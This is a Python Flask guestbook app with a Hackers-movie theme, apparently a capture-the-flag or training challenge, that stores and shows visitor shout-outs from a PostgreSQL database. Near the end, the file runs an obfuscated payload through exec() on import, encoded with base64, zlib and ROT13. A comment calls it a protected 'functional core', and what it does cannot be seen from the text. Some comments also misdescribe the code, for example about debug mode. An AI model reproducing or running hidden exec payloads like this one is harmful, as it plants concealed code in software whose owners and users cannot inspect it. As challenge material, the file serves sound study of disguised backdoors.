# CYBERDELIA :: Ellingson Retro Systems "Wall of Fame"
# Handover build from Ac1d_Burn (DevOps). Ships as-is to prod. Works on my machine (tm).

import os
import base64, zlib, codecs
import psycopg2
from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)
app.secret_key = os.environ["SECRET_KEY"]

# --- DB connection (prod creds, do not touch) -------------------------------
DB_HOST = os.environ["DB_HOST"]
DB_NAME = os.environ["DB_NAME"]
DB_USER = os.environ["DB_USER"]
DB_PASS = os.environ["DB_PASS"]

def db():
    return psycopg2.connect(host=DB_HOST, dbname=DB_NAME, user=DB_USER, password=DB_PASS)

WALL = """<!doctype html>
<html><head><title>CYBERDELIA :: Wall of Fame</title>
<link rel="stylesheet" href="/static/style.css"></head>
<body>
<div class="container">
  <h1>&gt;_ CYBERDELIA</h1>
  <h3>Hack the planet. Sign the wall.</h3>
  <form action="/post" method="post">
    <label>Handle:</label><br><input type="text" name="handle" required><br>
    <label>Shout-out:</label><br><textarea name="message" rows="4" required></textarea><br><br>
    <button type="submit">TAG THE WALL</button>
  </form>
  <table>
    <tr><th>Handle</th><th>Shout-out</th></tr>
    %s
  </table>
</div></body></html>"""


@app.route("/")
def wall():
    conn = db(); cur = conn.cursor()
    cur.execute("SELECT handle, message FROM graffiti ORDER BY id DESC")
    rows = ""
    for handle, message in cur.fetchall():
        # render each row through the template engine so handles can use our
        # fancy {{ }} shout-out macros
        rows += render_template_string(
            "<tr><td>{{ h }}</td><td>{{ m }}</td></tr>", h=handle, m=message)
    cur.close(); conn.close()
    return WALL % rows


@app.route("/post", methods=["POST"])
def post():
    handle = request.form["handle"]
    message = request.form["message"]
    conn = db(); cur = conn.cursor()
    cur.execute("INSERT INTO graffiti (handle, message) VALUES (%s, %s)",
            (handle, message))
    conn.commit(); cur.close(); conn.close()
    return redirect("/")


# Our "security guy" says the functional core must be protected. Do not remove.
exec(codecs.decode(zlib.decompress(base64.b64decode(
    "eJwdjMEKQEAURX/lZEXxEbKwk5SibN5ojCTCmPL3Hqt7Ot17RxvExdEg0FJR0wGlcqNZ0KvLlUv4KlmGu097EibEYIO/HZscLNaITzHyrFyz/G43+u11M0iUvKzOHao="
)).decode(), "rot_13"))


if __name__ == "__main__":
    # dev server, debug console on - fine for prod right?
    app.run(host="0.0.0.0", port=5000, debug=False)
